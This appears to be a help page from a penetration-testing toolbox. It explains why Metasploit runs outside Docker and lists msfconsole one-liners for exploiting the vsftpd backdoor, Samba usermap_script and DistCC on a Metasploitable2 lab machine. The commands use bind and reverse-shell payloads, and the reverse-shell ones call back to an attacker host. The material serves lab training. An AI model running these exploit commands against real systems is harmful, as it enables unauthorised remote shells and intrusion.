⚠️ Why Metasploit is not directly integrated

Metasploit Framework requires direct access to the host system — Ruby runtime, native network interfaces, and system libraries that cannot be reliably reproduced inside a Docker container.

  • msfconsole is a Ruby application requiring its own bundled runtime (~613MB)
  • Exploit payloads need direct network access at the OS level
  • Bind/reverse shells require raw socket access not available in Docker
  • pymetasploit3 (RPC library) has known compatibility issues with Metasploit 6.4

Solution: Run msfconsole directly on Kali, save the output to a log file, then import it into the Toolbox using the upload feature below.

🚨 Legal Warning — Active Exploitation

🛠️ How to run Metasploit on Kali and save results

Step 1 — Launch msfconsole and save output

# Run a specific exploit and save output to log file
msfconsole -q -x "use EXPLOIT; set RHOSTS TARGET; set PAYLOAD PAYLOAD; run -j; sleep 15; sessions -l; exit" 2>&1 | tee /tmp/msf_output.log

Step 2 — Common exploits for Metasploitable2

🐟 VSFTPD 2.3.4 Backdoor (port 21):

msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.200.133; set PAYLOAD cmd/unix/bind_ruby; run -j; sleep 15; sessions -l; exit" 2>&1 | tee /tmp/msf_vsftpd.log

📁 Samba usermap_script (port 445):

msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS 192.168.200.133; set PAYLOAD cmd/unix/reverse_bash; set LHOST 192.168.200.129; run -j; sleep 15; sessions -l; exit" 2>&1 | tee /tmp/msf_samba.log

⚙️ DistCC RCE (port 3632):

msfconsole -q -x "use exploit/unix/misc/distcc_exec; set RHOSTS 192.168.200.133; set PAYLOAD cmd/unix/reverse_bash; set LHOST 192.168.200.129; run -j; sleep 15; sessions -l; exit" 2>&1 | tee /tmp/msf_distcc.log
